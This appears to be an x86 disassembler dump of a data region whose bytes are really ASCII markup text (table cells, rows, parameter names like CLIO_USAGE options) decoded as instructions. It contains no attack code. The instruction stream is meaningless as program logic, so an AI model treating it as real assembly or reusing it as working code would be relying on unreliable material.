110097d1:	jne    0x11009841
110097d3:	fs cmp eax,0x756c4222
110097d9:	and    bh,BYTE PTR gs:[esi]
110097dc:	inc    ebx
110097dd:	dec    esp
110097de:	dec    ecx
110097df:	pop    edi
110097e0:	push   ebp
110097e1:	push   ebx
110097e2:	inc    ecx
110097e3:	inc    edi
110097e4:	inc    ebp
110097e5:	pop    edi
110097e6:	push   esi
110097e7:	pop    edi
110097e8:	dec    edi
110097e9:	push   eax
110097ea:	push   esp
110097eb:	dec    ecx
110097ec:	dec    edi
110097ed:	dec    esi
110097ee:	cmp    al,0x2f
110097f0:	push   eax
110097f1:	popa   
110097f2:	jb     0x11009855
110097f4:	addr16 jb 0x11009858
110097f7:	jo     0x11009861
110097f9:	ds or  eax,0x2020200a
110097ff:	and    BYTE PTR [eax],ah
11009801:	and    BYTE PTR [eax],ah
11009803:	and    BYTE PTR [edi+ebp*1],bh
11009806:	push   esp
11009807:	popa   
11009808:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100980c:	gs ins BYTE PTR es:[edi],dx
1100980e:	ins    BYTE PTR es:[edi],dx
1100980f:	ds or  eax,0x2020200a
11009815:	and    BYTE PTR [eax],ah
11009817:	and    BYTE PTR [eax],ah
11009819:	and    BYTE PTR [esp+edx*2],bh
1100981c:	popa   
1100981d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009821:	gs ins BYTE PTR es:[edi],dx
11009823:	ins    BYTE PTR es:[edi],dx
11009824:	ds or  eax,0x2020200a
1100982a:	and    BYTE PTR [eax],ah
1100982c:	and    BYTE PTR [eax],ah
1100982e:	and    BYTE PTR [eax],ah
11009830:	and    BYTE PTR [eax+edx*2],bh
11009833:	popa   
11009834:	jb     0x11009897
11009836:	addr16 jb 0x1100989a
11009839:	jo     0x110098a3
1100983b:	ds or  eax,0x2020200a
11009841:	and    BYTE PTR [eax],ah
11009843:	and    BYTE PTR [eax],ah
11009845:	and    BYTE PTR [eax],ah
11009847:	and    BYTE PTR [eax],ah
11009849:	and    BYTE PTR [ebx+0x4c],al
1100984c:	dec    ecx
1100984d:	pop    edi
1100984e:	push   ebp
1100984f:	push   ebx
11009850:	inc    ecx
11009851:	inc    edi
11009852:	inc    ebp
11009853:	pop    edi
11009854:	push   esi
11009855:	pop    edi
11009856:	dec    edi
11009857:	push   eax
11009858:	push   esp
11009859:	dec    ecx
1100985a:	dec    edi
1100985b:	dec    esi
1100985c:	pop    edi
1100985d:	inc    esp
1100985e:	inc    ebp
1100985f:	push   ebx
11009860:	inc    ebx
11009861:	or     eax,0x2020200a
11009866:	and    BYTE PTR [eax],ah
11009868:	and    BYTE PTR [eax],ah
1100986a:	and    BYTE PTR [eax],ah
1100986c:	and    BYTE PTR [edi+ebp*1],bh
1100986f:	push   eax
11009870:	popa   
11009871:	jb     0x110098d4
11009873:	addr16 jb 0x110098d7
11009876:	jo     0x110098e0
11009878:	ds or  eax,0x2020200a
1100987e:	and    BYTE PTR [eax],ah
11009880:	and    BYTE PTR [eax],ah
11009882:	and    BYTE PTR [edi+ebp*1],bh
11009885:	push   esp
11009886:	popa   
11009887:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100988b:	gs ins BYTE PTR es:[edi],dx
1100988d:	ins    BYTE PTR es:[edi],dx
1100988e:	ds or  eax,0x2020200a
11009894:	and    BYTE PTR [eax],ah
11009896:	and    BYTE PTR [edi+ebp*1],bh
11009899:	push   esp
1100989a:	popa   
1100989b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100989f:	outs   dx,DWORD PTR ds:[esi]
110098a0:	ja     0x110098e0
110098a2:	or     eax,0x2020200a
110098a7:	and    BYTE PTR [eax],ah
110098a9:	and    BYTE PTR ds:0x2020200a,cl
110098af:	and    BYTE PTR [eax],ah
110098b1:	and    BYTE PTR [esp+edx*2],bh
110098b4:	popa   
110098b5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110098b9:	outs   dx,DWORD PTR ds:[esi]
110098ba:	ja     0x110098fa
110098bc:	or     eax,0x2020200a
110098c1:	and    BYTE PTR [eax],ah
110098c3:	and    BYTE PTR [eax],ah
110098c5:	and    BYTE PTR [esp+edx*2],bh
110098c8:	popa   
110098c9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110098cd:	gs ins BYTE PTR es:[edi],dx
110098cf:	ins    BYTE PTR es:[edi],dx
110098d0:	ds or  eax,0x2020200a
110098d6:	and    BYTE PTR [eax],ah
110098d8:	and    BYTE PTR [eax],ah
110098da:	and    BYTE PTR [eax],ah
110098dc:	and    BYTE PTR [eax+edx*2],bh
110098df:	popa   
110098e0:	jb     0x11009943
110098e2:	addr16 jb 0x11009946
110098e5:	jo     0x1100994f
110098e7:	and    BYTE PTR [esi+0x6f],al
110098ea:	jb     0x11009951
110098ec:	addr16 jb 0x1100995e
110098ef:	jne    0x1100995f
110098f1:	fs cmp eax,0x756c4222
110098f7:	and    bh,BYTE PTR gs:[esi]
110098fa:	inc    ebx
110098fb:	dec    esp
110098fc:	dec    ecx
110098fd:	pop    edi
110098fe:	push   ebp
110098ff:	push   ebx
11009900:	inc    ecx
11009901:	inc    edi
11009902:	inc    ebp
11009903:	pop    edi
11009904:	inc    ebx
11009905:	pop    edi
11009906:	dec    edi
11009907:	push   eax
11009908:	push   esp
11009909:	dec    ecx
1100990a:	dec    edi
1100990b:	dec    esi
1100990c:	cmp    al,0x2f
1100990e:	push   eax
1100990f:	popa   
11009910:	jb     0x11009973
11009912:	addr16 jb 0x11009976
11009915:	jo     0x1100997f
11009917:	ds or  eax,0x2020200a
1100991d:	and    BYTE PTR [eax],ah
1100991f:	and    BYTE PTR [eax],ah
11009921:	and    BYTE PTR [edi+ebp*1],bh
11009924:	push   esp
11009925:	popa   
11009926:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100992a:	gs ins BYTE PTR es:[edi],dx
1100992c:	ins    BYTE PTR es:[edi],dx
1100992d:	ds or  eax,0x2020200a
11009933:	and    BYTE PTR [eax],ah
11009935:	and    BYTE PTR [eax],ah
11009937:	and    BYTE PTR [esp+edx*2],bh
1100993a:	popa   
1100993b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100993f:	gs ins BYTE PTR es:[edi],dx
11009941:	ins    BYTE PTR es:[edi],dx
11009942:	ds or  eax,0x2020200a
11009948:	and    BYTE PTR [eax],ah
1100994a:	and    BYTE PTR [eax],ah
1100994c:	and    BYTE PTR [eax],ah
1100994e:	and    BYTE PTR [eax+edx*2],bh
11009951:	popa   
11009952:	jb     0x110099b5
11009954:	addr16 jb 0x110099b8
11009957:	jo     0x110099c1
11009959:	ds inc ebx
1100995b:	dec    esp
1100995c:	dec    ecx
1100995d:	pop    edi
1100995e:	push   ebp
1100995f:	push   ebx
11009960:	inc    ecx
11009961:	inc    edi
11009962:	inc    ebp
11009963:	pop    edi
11009964:	inc    ebx
11009965:	pop    edi
11009966:	dec    edi
11009967:	push   eax
11009968:	push   esp
11009969:	dec    ecx
1100996a:	dec    edi
1100996b:	dec    esi
1100996c:	pop    edi
1100996d:	inc    esp
1100996e:	inc    ebp
1100996f:	push   ebx
11009970:	inc    ebx
11009971:	cmp    al,0x2f
11009973:	push   eax
11009974:	popa   
11009975:	jb     0x110099d8
11009977:	addr16 jb 0x110099db
1100997a:	jo     0x110099e4
1100997c:	ds or  eax,0x2020200a
11009982:	and    BYTE PTR [eax],ah
11009984:	and    BYTE PTR [eax],ah
11009986:	and    BYTE PTR [eax],ah
11009988:	and    BYTE PTR [eax+edx*2],bh
1100998b:	popa   
1100998c:	jb     0x110099ef
1100998e:	addr16 jb 0x110099f2
11009991:	jo     0x110099fb
11009993:	ds inc ebx
11009995:	dec    esp
11009996:	dec    ecx
11009997:	pop    edi
11009998:	push   ebp
11009999:	push   ebx
1100999a:	inc    ecx
1100999b:	inc    edi
1100999c:	inc    ebp
1100999d:	pop    edi
1100999e:	inc    ebx
1100999f:	pop    edi
110099a0:	dec    edi
110099a1:	push   eax
110099a2:	push   esp
110099a3:	dec    ecx
110099a4:	dec    edi
110099a5:	dec    esi
110099a6:	pop    edi
110099a7:	inc    ebp
110099a8:	pop    eax
110099a9:	inc    ecx
110099aa:	dec    ebp
110099ab:	push   eax
110099ac:	dec    esp
110099ad:	inc    ebp
110099ae:	cmp    al,0x2f
110099b0:	push   eax
110099b1:	popa   
110099b2:	jb     0x11009a15
110099b4:	addr16 jb 0x11009a18
110099b7:	jo     0x11009a21
110099b9:	ds or  eax,0x2020200a
110099bf:	and    BYTE PTR [eax],ah
110099c1:	and    BYTE PTR [eax],ah
110099c3:	and    BYTE PTR [edi+ebp*1],bh
110099c6:	push   esp
110099c7:	popa   
110099c8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
110099cc:	gs ins BYTE PTR es:[edi],dx
110099ce:	ins    BYTE PTR es:[edi],dx
110099cf:	ds or  eax,0x2020200a
110099d5:	and    BYTE PTR [eax],ah
110099d7:	and    BYTE PTR [edi+ebp*1],bh
110099da:	push   esp
110099db:	popa   
110099dc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110099e0:	outs   dx,DWORD PTR ds:[esi]
110099e1:	ja     0x11009a21
110099e3:	or     eax,0x200a0d0a
110099e8:	and    BYTE PTR [eax],ah
110099ea:	and    BYTE PTR [eax],ah
110099ec:	and    BYTE PTR [esp+edx*2],bh
110099ef:	popa   
110099f0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
110099f4:	outs   dx,DWORD PTR ds:[esi]
110099f5:	ja     0x11009a35
110099f7:	or     eax,0x2020200a
110099fc:	and    BYTE PTR [eax],ah
110099fe:	and    BYTE PTR [eax],ah
11009a00:	and    BYTE PTR [esp+edx*2],bh
11009a03:	popa   
11009a04:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009a08:	gs ins BYTE PTR es:[edi],dx
11009a0a:	ins    BYTE PTR es:[edi],dx
11009a0b:	ds or  eax,0x2020200a
11009a11:	and    BYTE PTR [eax],ah
11009a13:	and    BYTE PTR [eax],ah
11009a15:	and    BYTE PTR [eax],ah
11009a17:	and    BYTE PTR [eax+edx*2],bh
11009a1a:	popa   
11009a1b:	jb     0x11009a7e
11009a1d:	addr16 jb 0x11009a81
11009a20:	jo     0x11009a8a
11009a22:	and    BYTE PTR [esi+0x6f],al
11009a25:	jb     0x11009a8c
11009a27:	addr16 jb 0x11009a99
11009a2a:	jne    0x11009a9a
11009a2c:	fs cmp eax,0x756c4222
11009a32:	and    bh,BYTE PTR gs:[esi]
11009a35:	inc    ebx
11009a36:	dec    esp
11009a37:	dec    ecx
11009a38:	pop    edi
11009a39:	push   ebp
11009a3a:	push   ebx
11009a3b:	inc    ecx
11009a3c:	inc    edi
11009a3d:	inc    ebp
11009a3e:	pop    edi
11009a3f:	dec    eax
11009a40:	inc    ebp
11009a41:	dec    esp
11009a42:	push   eax
11009a43:	pop    edi
11009a44:	dec    edi
11009a45:	push   eax
11009a46:	push   esp
11009a47:	dec    ecx
11009a48:	dec    edi
11009a49:	dec    esi
11009a4a:	cmp    al,0x2f
11009a4c:	push   eax
11009a4d:	popa   
11009a4e:	jb     0x11009ab1
11009a50:	addr16 jb 0x11009ab4
11009a53:	jo     0x11009abd
11009a55:	ds or  eax,0x2020200a
11009a5b:	and    BYTE PTR [eax],ah
11009a5d:	and    BYTE PTR [eax],ah
11009a5f:	and    BYTE PTR [edi+ebp*1],bh
11009a62:	push   esp
11009a63:	popa   
11009a64:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009a68:	gs ins BYTE PTR es:[edi],dx
11009a6a:	ins    BYTE PTR es:[edi],dx
11009a6b:	ds or  eax,0x2020200a
11009a71:	and    BYTE PTR [eax],ah
11009a73:	and    BYTE PTR [eax],ah
11009a75:	and    BYTE PTR [esp+edx*2],bh
11009a78:	popa   
11009a79:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009a7d:	gs ins BYTE PTR es:[edi],dx
11009a7f:	ins    BYTE PTR es:[edi],dx
11009a80:	ds or  eax,0x2020200a
11009a86:	and    BYTE PTR [eax],ah
11009a88:	and    BYTE PTR [eax],ah
11009a8a:	and    BYTE PTR [eax],ah
11009a8c:	and    BYTE PTR [eax+edx*2],bh
11009a8f:	popa   
11009a90:	jb     0x11009af3
11009a92:	addr16 jb 0x11009af6
11009a95:	jo     0x11009aff
11009a97:	ds inc ebx
11009a99:	dec    esp
11009a9a:	dec    ecx
11009a9b:	pop    edi
11009a9c:	push   ebp
11009a9d:	push   ebx
11009a9e:	inc    ecx
11009a9f:	inc    edi
11009aa0:	inc    ebp
11009aa1:	pop    edi
11009aa2:	dec    eax
11009aa3:	inc    ebp
11009aa4:	dec    esp
11009aa5:	push   eax
11009aa6:	pop    edi
11009aa7:	dec    edi
11009aa8:	push   eax
11009aa9:	push   esp
11009aaa:	dec    ecx
11009aab:	dec    edi
11009aac:	dec    esi
11009aad:	pop    edi
11009aae:	inc    esp
11009aaf:	inc    ebp
11009ab0:	push   ebx
11009ab1:	inc    ebx
11009ab2:	cmp    al,0x2f
11009ab4:	push   eax
11009ab5:	popa   
11009ab6:	jb     0x11009b19
11009ab8:	addr16 jb 0x11009b1c
11009abb:	jo     0x11009b25
11009abd:	ds or  eax,0x2020200a
11009ac3:	and    BYTE PTR [eax],ah
11009ac5:	and    BYTE PTR [eax],ah
11009ac7:	and    BYTE PTR [edi+ebp*1],bh
11009aca:	push   esp
11009acb:	popa   
11009acc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009ad0:	gs ins BYTE PTR es:[edi],dx
11009ad2:	ins    BYTE PTR es:[edi],dx
11009ad3:	ds or  eax,0x2020200a
11009ad9:	and    BYTE PTR [eax],ah
11009adb:	and    BYTE PTR [edi+ebp*1],bh
11009ade:	push   esp
11009adf:	popa   
11009ae0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009ae4:	outs   dx,DWORD PTR ds:[esi]
11009ae5:	ja     0x11009b25
11009ae7:	or     eax,0x200a0d0a
11009aec:	and    BYTE PTR [eax],ah
11009aee:	and    BYTE PTR [eax],ah
11009af0:	and    BYTE PTR [esp+edx*2],bh
11009af3:	popa   
11009af4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009af8:	outs   dx,DWORD PTR ds:[esi]
11009af9:	ja     0x11009b39
11009afb:	or     eax,0x2020200a
11009b00:	and    BYTE PTR [eax],ah
11009b02:	and    BYTE PTR [eax],ah
11009b04:	and    BYTE PTR [esp+edx*2],bh
11009b07:	popa   
11009b08:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009b0c:	gs ins BYTE PTR es:[edi],dx
11009b0e:	ins    BYTE PTR es:[edi],dx
11009b0f:	ds or  eax,0x2020200a
11009b15:	and    BYTE PTR [eax],ah
11009b17:	and    BYTE PTR [eax],ah
11009b19:	and    BYTE PTR [eax],ah
11009b1b:	and    BYTE PTR [eax+edx*2],bh
11009b1e:	popa   
11009b1f:	jb     0x11009b82
11009b21:	addr16 jb 0x11009b85
11009b24:	jo     0x11009b8e
11009b26:	and    BYTE PTR [esi+0x6f],al
11009b29:	jb     0x11009b90
11009b2b:	addr16 jb 0x11009b9d
11009b2e:	jne    0x11009b9e
11009b30:	fs cmp eax,0x756c4222
11009b36:	and    bh,BYTE PTR gs:[esi]
11009b39:	inc    ebx
11009b3a:	dec    esp
11009b3b:	dec    ecx
11009b3c:	pop    edi
11009b3d:	push   ebp
11009b3e:	push   ebx
11009b3f:	inc    ecx
11009b40:	inc    edi
11009b41:	inc    ebp
11009b42:	pop    edi
11009b43:	inc    ebx
11009b44:	dec    edi
11009b45:	dec    esi
11009b46:	inc    esi
11009b47:	dec    ecx
11009b48:	inc    edi
11009b49:	inc    esi
11009b4a:	dec    ecx
11009b4b:	dec    esp
11009b4c:	inc    ebp
11009b4d:	pop    edi
11009b4e:	dec    edi
11009b4f:	push   eax
11009b50:	push   esp
11009b51:	dec    ecx
11009b52:	dec    edi
11009b53:	dec    esi
11009b54:	cmp    al,0x2f
11009b56:	push   eax
11009b57:	popa   
11009b58:	jb     0x11009bbb
11009b5a:	addr16 jb 0x11009bbe
11009b5d:	jo     0x11009bc7
11009b5f:	ds or  eax,0x2020200a
11009b65:	and    BYTE PTR [eax],ah
11009b67:	and    BYTE PTR [eax],ah
11009b69:	and    BYTE PTR [edi+ebp*1],bh
11009b6c:	push   esp
11009b6d:	popa   
11009b6e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009b72:	gs ins BYTE PTR es:[edi],dx
11009b74:	ins    BYTE PTR es:[edi],dx
11009b75:	ds or  eax,0x2020200a
11009b7b:	and    BYTE PTR [eax],ah
11009b7d:	and    BYTE PTR [eax],ah
11009b7f:	and    BYTE PTR [esp+edx*2],bh
11009b82:	popa   
11009b83:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009b87:	gs ins BYTE PTR es:[edi],dx
11009b89:	ins    BYTE PTR es:[edi],dx
11009b8a:	ds or  eax,0x2020200a
11009b90:	and    BYTE PTR [eax],ah
11009b92:	and    BYTE PTR [eax],ah
11009b94:	and    BYTE PTR [eax],ah
11009b96:	and    BYTE PTR [eax+edx*2],bh
11009b99:	popa   
11009b9a:	jb     0x11009bfd
11009b9c:	addr16 jb 0x11009c00
11009b9f:	jo     0x11009c09
11009ba1:	ds inc ebx
11009ba3:	dec    esp
11009ba4:	dec    ecx
11009ba5:	pop    edi
11009ba6:	push   ebp
11009ba7:	push   ebx
11009ba8:	inc    ecx
11009ba9:	inc    edi
11009baa:	inc    ebp
11009bab:	pop    edi
11009bac:	inc    ebx
11009bad:	dec    edi
11009bae:	dec    esi
11009baf:	inc    esi
11009bb0:	dec    ecx
11009bb1:	inc    edi
11009bb2:	inc    esi
11009bb3:	dec    ecx
11009bb4:	dec    esp
11009bb5:	inc    ebp
11009bb6:	pop    edi
11009bb7:	dec    edi
11009bb8:	push   eax
11009bb9:	push   esp
11009bba:	dec    ecx
11009bbb:	dec    edi
11009bbc:	dec    esi
11009bbd:	pop    edi
11009bbe:	inc    esp
11009bbf:	inc    ebp
11009bc0:	push   ebx
11009bc1:	inc    ebx
11009bc2:	cmp    al,0x2f
11009bc4:	push   eax
11009bc5:	popa   
11009bc6:	jb     0x11009c29
11009bc8:	addr16 jb 0x11009c2c
11009bcb:	jo     0x11009c35
11009bcd:	ds or  eax,0x2020200a
11009bd3:	and    BYTE PTR [eax],ah
11009bd5:	and    BYTE PTR [eax],ah
11009bd7:	and    BYTE PTR [edi+ebp*1],bh
11009bda:	push   esp
11009bdb:	popa   
11009bdc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009be0:	gs ins BYTE PTR es:[edi],dx
11009be2:	ins    BYTE PTR es:[edi],dx
11009be3:	ds or  eax,0x2020200a
11009be9:	and    BYTE PTR [eax],ah
11009beb:	and    BYTE PTR [edi+ebp*1],bh
11009bee:	push   esp
11009bef:	popa   
11009bf0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009bf4:	outs   dx,DWORD PTR ds:[esi]
11009bf5:	ja     0x11009c35
11009bf7:	or     eax,0x200a0d0a
11009bfc:	and    BYTE PTR [eax],ah
11009bfe:	and    BYTE PTR [eax],ah
11009c00:	and    BYTE PTR [esp+edx*2],bh
11009c03:	popa   
11009c04:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009c08:	outs   dx,DWORD PTR ds:[esi]
11009c09:	ja     0x11009c49
11009c0b:	or     eax,0x2020200a
11009c10:	and    BYTE PTR [eax],ah
11009c12:	and    BYTE PTR [eax],ah
11009c14:	and    BYTE PTR [esp+edx*2],bh
11009c17:	popa   
11009c18:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009c1c:	gs ins BYTE PTR es:[edi],dx
11009c1e:	ins    BYTE PTR es:[edi],dx
11009c1f:	and    BYTE PTR [ebx+0x6f],al
11009c22:	ins    BYTE PTR es:[edi],dx
11009c23:	jne    0x11009c92
11009c25:	outs   dx,BYTE PTR ds:[esi]
11009c26:	push   ebx
11009c27:	jo     0x11009c8a
11009c29:	outs   dx,BYTE PTR ds:[esi]
11009c2a:	cmp    eax,0x3e223222
11009c2f:	and    BYTE PTR [eax],ah
11009c31:	and    BYTE PTR [eax],ah
11009c33:	and    BYTE PTR [eax],ah
11009c35:	and    BYTE PTR [eax],ah
11009c37:	and    BYTE PTR [eax],ah
11009c39:	or     eax,0x2020200a
11009c3e:	and    BYTE PTR [eax],ah
11009c40:	and    BYTE PTR [eax],ah
11009c42:	and    BYTE PTR [edi+ebp*1],bh
11009c45:	push   esp
11009c46:	popa   
11009c47:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009c4b:	gs ins BYTE PTR es:[edi],dx
11009c4d:	ins    BYTE PTR es:[edi],dx
11009c4e:	ds or  eax,0x2020200a
11009c54:	and    BYTE PTR [eax],ah
11009c56:	and    BYTE PTR [edi+ebp*1],bh
11009c59:	push   esp
11009c5a:	popa   
11009c5b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009c5f:	outs   dx,DWORD PTR ds:[esi]
11009c60:	ja     0x11009ca0
11009c62:	or     eax,0x2020200a
11009c67:	and    BYTE PTR [edi+ebp*1],bh
11009c6a:	push   esp
11009c6b:	popa   
11009c6c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009c70:	outs   dx,DWORD PTR ds:[esi]
11009c71:	ja     0x11009cba
11009c73:	jb     0x11009ce4
11009c75:	jne    0x11009ce7
11009c77:	ds or  eax,0x200a0d0a
11009c7d:	and    BYTE PTR [eax],ah
11009c7f:	and    BYTE PTR [esp+edx*2],bh
11009c82:	popa   
11009c83:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009c87:	outs   dx,DWORD PTR ds:[esi]
11009c88:	ja     0x11009cd1
11009c8a:	jb     0x11009cfb
11009c8c:	jne    0x11009cfe
11009c8e:	and    BYTE PTR [ebx+0x74],dl
11009c91:	jns    0x11009cff
11009c93:	gs cmp eax,0x74537b22
11009c99:	popa   
11009c9a:	je     0x11009d05
11009c9c:	arpl   WORD PTR [edx+0x65],dx
11009c9f:	jae    0x11009d10
11009ca1:	jne    0x11009d15
11009ca3:	arpl   WORD PTR [ebp+0x20],sp
11009ca6:	push   0x65646165
11009cab:	jb     0x11009cf3
11009cad:	outs   dx,DWORD PTR ds:[esi]
11009cae:	outs   dx,DWORD PTR ds:[esi]
11009caf:	je     0x11009d16
11009cb1:	jb     0x11009d05
11009cb3:	outs   dx,DWORD PTR ds:[esi]
11009cb4:	ja     0x11009d09
11009cb6:	je     0x11009d31
11009cb8:	ins    BYTE PTR es:[edi],dx
11009cb9:	gs jge 0x11009cde
11009cbc:	ds or  eax,0x200a0d0a
11009cc2:	and    BYTE PTR [eax],ah
11009cc4:	and    BYTE PTR [eax],ah
11009cc6:	and    BYTE PTR [esp+edx*2],bh
11009cc9:	popa   
11009cca:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009cce:	outs   dx,DWORD PTR ds:[esi]
11009ccf:	ja     0x11009d0f
11009cd1:	or     eax,0x2020200a
11009cd6:	and    BYTE PTR [eax],ah
11009cd8:	and    BYTE PTR [eax],ah
11009cda:	and    BYTE PTR [esp+edx*2],bh
11009cdd:	popa   
11009cde:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009ce2:	gs ins BYTE PTR es:[edi],dx
11009ce4:	ins    BYTE PTR es:[edi],dx
11009ce5:	and    BYTE PTR [ebx+0x6f],al
11009ce8:	ins    BYTE PTR es:[edi],dx
11009ce9:	jne    0x11009d58
11009ceb:	outs   dx,BYTE PTR ds:[esi]
11009cec:	push   ebx
11009ced:	jo     0x11009d50
11009cef:	outs   dx,BYTE PTR ds:[esi]
11009cf0:	cmp    eax,0x3e223222
11009cf5:	or     eax,0x2020200a
11009cfa:	and    BYTE PTR [eax],ah
11009cfc:	and    BYTE PTR [eax],ah
11009cfe:	and    BYTE PTR [eax],ah
11009d00:	and    BYTE PTR [eax+edx*2],bh
11009d03:	popa   
11009d04:	jb     0x11009d67
11009d06:	addr16 jb 0x11009d6a
11009d09:	jo     0x11009d73
11009d0b:	ds inc ebx
11009d0d:	dec    esp
11009d0e:	dec    ecx
11009d0f:	pop    edi
11009d10:	push   ebp
11009d11:	push   ebx
11009d12:	inc    ecx
11009d13:	inc    edi
11009d14:	inc    ebp
11009d15:	pop    edi
11009d16:	push   eax
11009d17:	inc    ecx
11009d18:	inc    ebx
11009d19:	dec    ebx
11009d1a:	inc    ecx
11009d1b:	inc    edi
11009d1c:	inc    ebp
11009d1d:	pop    edi
11009d1e:	push   esp
11009d1f:	pop    ecx
11009d20:	push   eax
11009d21:	inc    ebp
11009d22:	push   ebx
11009d23:	cmp    al,0x2f
11009d25:	push   eax
11009d26:	popa   
11009d27:	jb     0x11009d8a
11009d29:	addr16 jb 0x11009d8d
11009d2c:	jo     0x11009d96
11009d2e:	ds or  eax,0x2020200a
11009d34:	and    BYTE PTR [eax],ah
11009d36:	and    BYTE PTR [eax],ah
11009d38:	and    BYTE PTR [edi+ebp*1],bh
11009d3b:	push   esp
11009d3c:	popa   
11009d3d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009d41:	gs ins BYTE PTR es:[edi],dx
11009d43:	ins    BYTE PTR es:[edi],dx
11009d44:	ds or  eax,0x2020200a
11009d4a:	and    BYTE PTR [eax],ah
11009d4c:	and    BYTE PTR [edi+ebp*1],bh
11009d4f:	push   esp
11009d50:	popa   
11009d51:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009d55:	outs   dx,DWORD PTR ds:[esi]
11009d56:	ja     0x11009d96
11009d58:	or     eax,0x200a0d0a
11009d5d:	and    BYTE PTR [eax],ah
11009d5f:	and    BYTE PTR [edi+ebp*1],bh
11009d62:	push   esp
11009d63:	popa   
11009d64:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009d68:	outs   dx,DWORD PTR ds:[esi]
11009d69:	ja     0x11009db2
11009d6b:	jb     0x11009ddc
11009d6d:	jne    0x11009ddf
11009d6f:	ds or  eax,0x2020200a
11009d75:	and    BYTE PTR [esp+edx*2],bh
11009d78:	popa   
11009d79:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009d7d:	outs   dx,DWORD PTR ds:[esi]
11009d7e:	ja     0x11009dc7
11009d80:	jb     0x11009df1
11009d82:	jne    0x11009df4
11009d84:	and    BYTE PTR [ebx+0x74],dl
11009d87:	jns    0x11009df5
11009d89:	gs cmp eax,0x74537b22
11009d8f:	popa   
11009d90:	je     0x11009dfb
11009d92:	arpl   WORD PTR [edx+0x65],dx
11009d95:	jae    0x11009e06
11009d97:	jne    0x11009e0b
11009d99:	arpl   WORD PTR [ebp+0x20],sp
11009d9c:	fs popa 
11009d9e:	je     0x11009e01
11009da0:	push   edx
11009da1:	outs   dx,DWORD PTR ds:[esi]
11009da2:	ja     0x11009df7
11009da4:	je     0x11009e1f
11009da6:	ins    BYTE PTR es:[edi],dx
11009da7:	gs jge 0x11009dcc
11009daa:	ds or  eax,0x200a0d0a
11009db0:	and    BYTE PTR [eax],ah
11009db2:	and    BYTE PTR [eax],ah
11009db4:	and    BYTE PTR [esp+edx*2],bh
11009db7:	popa   
11009db8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
11009dbc:	outs   dx,DWORD PTR ds:[esi]
11009dbd:	ja     0x11009dfd
11009dbf:	or     eax,0x2020200a
11009dc4:	and    BYTE PTR [eax],ah
11009dc6:	and    BYTE PTR [eax],ah
11009dc8:	and    BYTE PTR [esp+edx*2],bh
11009dcb:	popa   
11009dcc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009dd0:	gs ins BYTE PTR es:[edi],dx
11009dd2:	ins    BYTE PTR es:[edi],dx
11009dd3:	ds or  eax,0x2020200a
11009dd9:	and    BYTE PTR [eax],ah
11009ddb:	and    BYTE PTR [eax],ah
11009ddd:	and    BYTE PTR [eax],ah
11009ddf:	and    BYTE PTR [eax+edx*2],bh
11009de2:	popa   
11009de3:	jb     0x11009e46
11009de5:	addr16 jb 0x11009e49
11009de8:	jo     0x11009e52
11009dea:	and    BYTE PTR [esi+0x6f],al
11009ded:	jb     0x11009e54
11009def:	addr16 jb 0x11009e61
11009df2:	jne    0x11009e62
11009df4:	fs cmp eax,0x756c4222
11009dfa:	and    bh,BYTE PTR gs:[esi]
11009dfd:	inc    ebx
11009dfe:	dec    esp
11009dff:	dec    ecx
11009e00:	pop    edi
11009e01:	push   ebp
11009e02:	push   ebx
11009e03:	inc    ecx
11009e04:	inc    edi
11009e05:	inc    ebp
11009e06:	pop    edi
11009e07:	push   eax
11009e08:	inc    ecx
11009e09:	inc    ebx
11009e0a:	dec    ebx
11009e0b:	inc    ecx
11009e0c:	inc    edi
11009e0d:	inc    ebp
11009e0e:	pop    edi
11009e0f:	push   esp
11009e10:	pop    ecx
11009e11:	push   eax
11009e12:	inc    ebp
11009e13:	push   ebx
11009e14:	cmp    al,0x2f
11009e16:	push   eax
11009e17:	popa   
11009e18:	jb     0x11009e7b
11009e1a:	addr16 jb 0x11009e7e
11009e1d:	jo     0x11009e87
11009e1f:	ds or  eax,0x2020200a
11009e25:	and    BYTE PTR [eax],ah
11009e27:	and    BYTE PTR [eax],ah
11009e29:	and    BYTE PTR [edi+ebp*1],bh
11009e2c:	push   esp
11009e2d:	popa   
11009e2e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
11009e32:	gs ins BYTE PTR es:[edi],dx
11009e34:	ins    BYTE PTR es:[edi],dx
11009e35:	ds or  eax,0x2020200a
11009e3b:	and    BYTE PTR [eax],ah
